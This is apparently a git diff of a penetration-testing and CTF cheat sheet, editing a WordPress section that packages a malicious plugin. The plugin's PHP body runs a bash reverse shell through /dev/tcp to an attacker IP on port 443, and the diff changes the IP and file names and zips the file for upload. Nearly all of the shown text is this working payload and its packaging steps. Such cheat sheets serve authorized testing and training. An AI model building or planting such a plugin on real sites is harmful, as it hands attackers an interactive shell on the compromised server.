@@ -109,26 +109,26 @@ __Pentesting - Red Team - CTFs - OSCP__
   `Wordpress`
 
   ```cmd
-  root@kali:~# nano reverse.php
+  root@kali:~# nano plugin.php
   ```
   ```php
   <?php
 
   /**
-  * Plugin Name: Shelly
+  * Plugin Name: Shell
   * Plugin URI:
-  * Description: Love Shelly
+  * Description: Love Shell
   * Version: 1.0
   * Author: d4t4s3c
   * Author URI: http://github.com/d4t4s3c
   */
 
-  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.75/443 0>&1'");
+  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
   ?>
   ```
   
   ```cmd
-  root@kali:~# zip reverse.zip reverse.php
+  root@kali:~# zip plugin.zip plugin.php
   ```
   
   * Plugins
